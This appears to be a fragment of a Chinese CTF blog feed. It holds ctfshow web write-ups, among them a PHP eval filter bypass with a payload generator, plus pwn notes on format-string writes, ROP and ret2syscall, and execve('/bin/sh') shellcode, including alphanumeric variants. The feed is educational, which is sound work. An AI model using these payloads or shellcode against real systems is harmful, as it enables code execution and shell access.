class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>八进制绕过，前面加个字符：<code>?num=%0a010574</code>。</p><p>​    </p><h3 id="shellme"><a href="#shellme" class="headerlink" title="shellme"></a>shellme</h3><blockquote><p>还是熟悉的感觉</p></blockquote><p>phpinfo页面直接搜flag，很熟悉。</p><p>​    </p><h3 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h3><blockquote><p>由于上个题有严重的非预期，我的锅，在此给师傅们道歉了</p></blockquote><p>cookie 看到 hint=looklook，访问 <code>?looklook=1</code> 得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$ctfshow</span>) || strlen(<span class="variable">$ctfshow</span>) &lt;= <span class="number">107</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>禁用了很多 RCE 绕过姿势，未禁用 <code>$+_;?()[]&lt;&gt;</code>、字母<code>C</code> 和数字<code>0-3</code>，尝试用截断输出内容，用PHP自增特性生成其他字母：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_=[];?&gt;&lt;?=$_ //真Array</span><br><span class="line">$_=([].C);?&gt;&lt;?=$_ //字符串ArrayC</span><br><span class="line">$_=([].C)[3];?&gt;&lt;?=$_ //字母a</span><br><span class="line">$_=([].C)[3];$_++;?&gt;&lt;?=$_ //字母b</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>根据PHP拼接特性，将需要的关键字拆分成字母，用自增特性生成，按照字母序生成可节省payload长度。</p><p>payload生成脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload: xxxxxx?&gt;&lt;?=($_GET[0])($_GET[1]);</span></span><br><span class="line"></span><br><span class="line">alpha = <span class="built_in">list</span>(<span class="built_in">set</span>(need))</span><br><span class="line">alpha.sort()</span><br><span class="line"><span class="built_in">print</span>(alpha)</span><br><span class="line">greece = <span class="string">&#x27;α β γ δ ε ζ ν ξ ο π ρ σ η θ ι κ λ μ τ υ φ χ ψ ω Γ Δ&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;$_=C;&#x27;</span></span><br><span class="line">cnt = <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> alpha:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">now_php = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(k)-cnt):</span><br><span class="line">now_php += <span class="string">&#x27;$_++;&#x27;</span></span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">now_php += <span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>=$_;&#x27;</span></span><br><span class="line">out += now_php</span><br><span class="line"></span><br><span class="line">func = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> need:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">func += [<span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">func += [k]</span><br><span class="line">func = <span class="string">&#x27;.&#x27;</span>.join(func)</span><br><span class="line"><span class="built_in">print</span>(func)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;<span class="subst">&#123;out&#125;</span>?&gt;&lt;?=($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[0])($&#123;&#123;_.<span class="subst">&#123;func&#125;</span>&#125;&#125;[1]);&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>POST：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf_show = </span><br><span class="line">$_=([].C)[3];$α=$_;$_++;$_++;$_++;$_++;$ε=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$σ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$χ=$_;$β=$ε.$χ.$α.$σ;$_=C;$_++;$_++;$γ=$_;$_++;$_++;$ε=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$μ=$_;($&#123;_.$ε.$γ.$μ&#125;[0])($&#123;_.$ε.$γ.$μ&#125;[1]);</span><br></pre></td></tr></table></figure><p>GET:</p><p><code>?looklook=1&amp;0=file_get_contents&amp;1=/flag.txt</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;比赛名称：ctfshow 吃瓜杯&lt;br&gt;题目范围：web pwn re misc crypto&lt;br&gt;题目难度：怎么简单怎么来&lt;br&gt;比赛奖励：ctfshow定制鼠标垫或萌妹手办&lt;br&gt;比赛时间：2021年8月14日(周六) 晚 7点7分&lt;br&gt;比</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串</title>
    <link href="https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2021-08-08T10:23:45.000Z</published>
    <updated>2022-08-09T16:20:17.091Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>格式化字符串函数可以接受可变数量的参数，并<strong>将第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。</p><p>​    </p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>基本格式：<code>%[parameter][flags][field width][.precision][length]type</code></p><p>参数（parameter）</p><ul><li><code>n$</code>：获取格式化字符串中的指定参数</li></ul><p>长度（length）</p><ul><li><code>hh</code>：输出一个字节</li><li><code>h</code>：输出一个双字节</li></ul><p>类型（type）</p><ul><li><code>d/i</code>：有符号整数</li><li><code>u</code>：无符号整数</li><li><code>x/X</code>：16进制无符号整数</li><li><code>o</code>：8进制无符号整数</li><li><code>n</code>：不输出字符，但是把<strong>已经成功输出的字符个数写入对应的整型指针参数所指的变量</strong>。</li></ul><p>​    </p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><p><code>%X$p</code>：泄露栈上第X个位置的值（X为任意正整数）</p><p><code>addr%X$p</code>：泄露任意地址的数据（<code>addr</code>为要泄露的地址）</p><p>​    </p><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p><code>%Yc%X$n</code>：将Y写入栈上第X个位置指针指向的位置（Y为要写入的数据，X为任意正整数）</p><p><code>addr%(Y-4)c%X$n</code>：向任意地址写（<code>addr</code>为要写入的地址）</p><h4 id="栈地址覆盖"><a href="#栈地址覆盖" class="headerlink" title="栈地址覆盖"></a>栈地址覆盖</h4><p>例：把c的值从789改写为16。</p><p><code>c_addr</code> 占4个字节，所以额外加上12个字节，最终向 <code>c_addr</code> 指向的空间赋值16：</p><p><code>payload = p32(c_addr) + b&#39;%12c&#39; + b&#39;%6$n&#39;</code></p><h4 id="小数覆盖"><a href="#小数覆盖" class="headerlink" title="小数覆盖"></a>小数覆盖</h4><p>例：把a的值改写为2。</p><p>如果还用之前的方式，写入的地址最少要占4位，因此最小只能赋值4，尝试把地址放到后面的位置。</p><p>赋值2，要写作<code>aa%X$n</code>, 把2赋值给第X个位置指针指向的位置。这个字符串长度为6，不是4的倍数，所以还要补全两个字符，再加上a的地址。这样最终a是落在了栈上第8个位置：</p><p><code>payload = b&#39;aa%8$nbb&#39; + p32(a_addr)</code></p><h4 id="大数覆盖"><a href="#大数覆盖" class="headerlink" title="大数覆盖"></a>大数覆盖</h4><p>例：把b的值改写为0x12345678。</p><p>需要赋值一个很大的数，这时候直接向栈中写入这么多的数据肯定不太方便。利用 <code>hh</code>（单字节） 和 <code>h</code>（双字节） 参数逐字节写入。</p><p>以单字节的方式写入，若b的地址是 <code>0x0804c028</code>，逐字节写入后的数据分配应该如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0804c028 \x78</span><br><span class="line">0x0804c029\x56</span><br><span class="line">0x0804c02a\x34</span><br><span class="line">0x0804c02b\x12</span><br></pre></td></tr></table></figure><p>因此随着构造payload，字符串长度是逐渐增长的，因此要按照从小到大的顺序填充字节，这里要从高位向地位填充：</p><p><code>payload = p32(0x0804c02b) + b&#39;a&#39;*(0x12 - 4) + b&#39;%6$hhn&#39;</code> （当前总长度=24，字符长度0x12）</p><p>下面填充次高位。填充后面的时候要注意，因为这是一次发送的payload，因此填充后面的时候，前面的字符串长度也要算上，前面的字符串长度已经有24个字节，因此次高位的地址会写入第25-28个字节，这样对应的就是栈中的第12个位置（24/4 + 6）。</p><p>构造次高位的字符串时要注意<strong>不能包括 <code>%6$hhn</code> 的长度</strong>，因此接下来还要填充的字符串个数是 <code>次高字节需要的总字节数 - 填充上一字节已经构造的字节数 - 次高字节地址位数</code>。次高地址这里后续还有payload要填充，由于要地址对齐，因此添加三个<code>b</code>，使得总长度为4的倍数：</p><p><code>payload += p32(0x0804c02a) + b&#39;a&#39;*(0x34 - 0x12 - 4) + b&#39;%12$hhn&#39; + b&#39;bbb&#39;</code> （当前总长度=68）</p><p>接下来填充次低位。构造方法和上面类似，不过添加字符的时候要记得把 <code>bbb</code> 这三个对齐字节的长度减去：</p><p><code>payload += p32(0x0804c029) + b&#39;a&#39;*(0x56 - 0x34 - 4 - 3) + b&#39;%23$hhn&#39; + b&#39;bb&#39;</code> （当前总长度=108）</p><p>最后填充低位：</p><p><code>payload += p32(0x0804c028) + b&#39;a&#39;*(0x78- 0x56 - 4 - 2) + b&#39;%33$hhn&#39;</code></p><h4 id="pwntools工具"><a href="#pwntools工具" class="headerlink" title="pwntools工具"></a>pwntools工具</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br><span class="line"></span><br><span class="line">offset (int): 字符串的偏移，从1开始</span><br><span class="line">writes (dict): 注入的地址和值，&#123;target_addr:change_to&#125;</span><br><span class="line">numbwritten (int) : 已经由printf函数写入的字节数，默认为0</span><br><span class="line">write_size : 逐byte/short/int写入，默认是byte</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;格式化字符串函数可以接受可变数量的参数，并&lt;strong&gt;将第一个参数作为格式化字符串，根据其来解析之后的参数&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;​    &lt;/p&gt;
&lt;h2 id=&quot;格式化字符串&quot;&gt;&lt;a href=&quot;#格式化字符串&quot; class=&quot;</summary>
      
    
    
    
    <category term="pwn" scheme="https://lazzzaro.github.io/categories/pwn/"/>
    
    
    <category term="格式化字符串" scheme="https://lazzzaro.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>堆</title>
    <link href="https://lazzzaro.github.io/2021/08/08/pwn-%E5%A0%86/"/>
    <id>https://lazzzaro.github.io/2021/08/08/pwn-%E5%A0%86/</id>
    <published>2021-08-08T09:59:44.000Z</published>
    <updated>2022-08-08T15:20:56.155Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>堆</p><p>​    </p><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>（预留）</p><p>​    </p><h2 id="bin攻击"><a href="#bin攻击" class="headerlink" title="bin攻击"></a>bin攻击</h2><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>（预留）</p><p>​    </p><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>（预留）</p><p>​    </p><h3 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h3><p>（预留）</p><p>​    </p><h3 id="tcache-attack"><a href="#tcache-attack" class="headerlink" title="tcache attack"></a>tcache attack</h3><p>（预留）</p><p>​    </p><h2 id="off-by攻击"><a href="#off-by攻击" class="headerlink" title="off by攻击"></a>off by攻击</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h3><p>（预留）</p><p>​    </p><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>（预留）</p><p>​    </p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>（预留）</p><p>​    </p><h2 id="house-of系列"><a href="#house-of系列" class="headerlink" title="house of系列"></a>house of系列</h2><h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p>（预留）</p><p>​    </p><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><p>（预留）</p><p>​    </p><h3 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h3><p>（预留）</p><p>​    </p><h3 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h3><p>（预留）</p><p>​    </p><h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><p>（预留）</p><p>​    </p><h3 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h3><p>（预留）</p><p>​    </p><h3 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h3><p>（预留）</p><p>​    </p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>（预留）</p><p>​    </p><h3 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h3><p>（预留）</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;堆&lt;/p&gt;
&lt;p&gt;​    &lt;/p&gt;
&lt;h2 id=&quot;UAF&quot;&gt;&lt;a href=&quot;#UAF&quot; class=&quot;headerlink&quot; title=&quot;UAF&quot;&gt;&lt;/a&gt;UAF&lt;/h2&gt;&lt;p&gt;（预留）&lt;/p&gt;
&lt;p&gt;​    &lt;/p&gt;
&lt;h2 id=&quot;b</summary>
      
    
    
    
    <category term="pwn" scheme="https://lazzzaro.github.io/categories/pwn/"/>
    
    
    <category term="堆" scheme="https://lazzzaro.github.io/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>栈</title>
    <link href="https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%88/"/>
    <id>https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%88/</id>
    <published>2021-08-08T09:59:35.000Z</published>
    <updated>2023-01-09T16:20:39.205Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>ROP（Return-Oriented Programming, 返回导向编程）</p><p>通过栈溢出的漏洞，覆盖return address，从而达让直行程序反复横跳的一种技术。</p><h3 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h3><p>生成ROPchain：</p><p><code>ROPgadget --binary [file] --ropchain</code></p><p><code>ropper --file [file] --chain execve</code></p><p>​    </p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>调用约定：系统调用号 <code>$eax</code>，参数：<code>$ebx/$ecx/$edx/$esi/$edi/$ebp</code>，调用 <code>int 0x80</code>。</p><p>调用 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># $eax = 0xb = 11</span></span><br><span class="line">ROPgadget --binary vuln --only <span class="string">&quot;pop|ret&quot;</span> | grep eax</span><br><span class="line"><span class="comment"># $ebx = [&quot;/bin/sh&quot;]</span></span><br><span class="line">ROPgadget --binary vuln --only <span class="string">&quot;pop|ret&quot;</span> | grep ebx</span><br><span class="line">ROPgadget --binary vuln --string <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"><span class="comment"># $ecx = 0</span></span><br><span class="line">ROPgadget --binary vuln --only <span class="string">&quot;pop|ret&quot;</span> | grep ecx</span><br><span class="line"><span class="comment"># $edx = 0</span></span><br><span class="line">ROPgadget --binary vuln --only <span class="string">&quot;pop|ret&quot;</span> | grep edx</span><br><span class="line"><span class="comment"># int 0x80</span></span><br><span class="line">ROPgadget --binary vuln --only <span class="string">&quot;int&quot;</span></span><br></pre></td></tr></table></figure><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>调用约定：系统调用号 <code>$rax</code>，参数：<code>$rdi/$rsi/$rdx/$rcx($r10)/$r8/$r9</code>，调用 <code>syscall</code>。</p><p>调用 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># $rax = 0x3b = 59</span></span><br><span class="line">ROPgadget --binary vuln --only <span class="string">&quot;pop|ret&quot;</span> | grep rax</span><br><span class="line"><span class="comment"># $rdi = [&quot;/bin/sh&quot;]</span></span><br><span class="line">ROPgadget --binary vuln --only <span class="string">&quot;pop|ret&quot;</span> | grep rdi</span><br><span class="line">ROPgadget --binary vuln --string <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"><span class="comment"># $rsi = 0</span></span><br><span class="line">ROPgadget --binary vuln --only <span class="string">&quot;pop|ret&quot;</span> | grep rsi</span><br><span class="line"><span class="comment"># $rdx = 0</span></span><br><span class="line">ROPgadget --binary vuln --only <span class="string">&quot;pop|ret&quot;</span> | grep rdx</span><br><span class="line"><span class="comment"># syscall</span></span><br><span class="line">ROPgadget --binary vuln --only <span class="string">&quot;syscall&quot;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p><strong>shellcode数据库：</strong></p><p><a href="http://www.shell-storm.org/shellcode/">Shellcodes database for study cases</a></p><h4 id="常用shellcode"><a href="#常用shellcode" class="headerlink" title="常用shellcode"></a>常用shellcode</h4><p><strong>pwntools</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">shellcode = asm(shellcreaft.sh())</span><br></pre></td></tr></table></figure><p><strong>32位</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># other</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                    push eax</span></span><br><span class="line"><span class="string">                    pop ebx </span></span><br><span class="line"><span class="string">                    push edx</span></span><br><span class="line"><span class="string">                    pop eax</span></span><br><span class="line"><span class="string">                    dec eax</span></span><br><span class="line"><span class="string">                    xor al,0x46</span></span><br><span class="line"><span class="string">                    xor byte ptr[ebx+0x35],al #set int 0x80</span></span><br><span class="line"><span class="string">                    xor byte ptr[ebx+0x36],al</span></span><br><span class="line"><span class="string">                    push ecx </span></span><br><span class="line"><span class="string">                    pop eax</span></span><br><span class="line"><span class="string">                    xor al, 0x41</span></span><br><span class="line"><span class="string">                    xor al, 0x40</span></span><br><span class="line"><span class="string">                    push ecx</span></span><br><span class="line"><span class="string">                    pop eax</span></span><br><span class="line"><span class="string">                    xor al, 0x41</span></span><br><span class="line"><span class="string">                    xor al, 0x40</span></span><br><span class="line"><span class="string">                    push ecx</span></span><br><span class="line"><span class="string">                    pop eax</span></span><br><span class="line"><span class="string">                    xor al, 0x41</span></span><br><span class="line"><span class="string">                    xor al, 0x40</span></span><br><span class="line"><span class="string">                    push ecx # set al=0xb</span></span><br><span class="line"><span class="string">                    pop eax</span></span><br><span class="line"><span class="string">                    xor al, 0x41</span></span><br><span class="line"><span class="string">                    xor al, 0x40</span></span><br><span class="line"><span class="string">                    push edx  # set ecx=0</span></span><br><span class="line"><span class="string">                    pop ecx</span></span><br><span class="line"><span class="string">                    push 0x68 # push /bin/sh</span></span><br><span class="line"><span class="string">                    push 0x732f2f2f</span></span><br><span class="line"><span class="string">                    push 0x6e69622f</span></span><br><span class="line"><span class="string">                    push esp</span></span><br><span class="line"><span class="string">                    pop ebx</span></span><br><span class="line"><span class="string">                    &#x27;&#x27;&#x27;</span>) </span><br></pre></td></tr></table></figure><p><strong>64位</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># other</span></span><br><span class="line">shellcode = <span class="string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure><h4 id="shellcode限制"><a href="#shellcode限制" class="headerlink" title="shellcode限制"></a>shellcode限制</h4><h5 id="可见字符"><a href="#可见字符" class="headerlink" title="可见字符"></a>可见字符</h5><p><code>Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</code></p><p>工具：<a href="https://github.com/veritas501/ae64">AE64</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure><p>参考：MRCTF 2020 - shellcode_revenge</p><h5 id="更多限制"><a href="#更多限制" class="headerlink" title="更多限制"></a>更多限制</h5><p>函数 <code>__ctype_b_loc()</code></p><p>如 <code>if ( ((*__ctype_b_loc())][s[i]] &amp; 0x4000) == 0 &amp;&amp; s[i] != 10) &#123;&#125;</code></p><p>见 <code>ctype/ctype.h</code> 源码，作用为将输入的字符根据 <code>((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8))</code> 进行处理，然后根据下面表对应的结果进行返回。</p><p><img src="/2021/08/08/pwn-%E6%A0%88/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAeW9uZ2Jhb2lp,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述" style="zoom:80%;"></p><p>参考：2021 天翼杯 - ezshell</p><p>​    </p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><strong>libc数据库：</strong></p><p><a href="https://libc.blukat.me/">https://libc.blukat.me/</a></p><p><a href="https://libc.rip/">https://libc.rip/</a></p><p><a 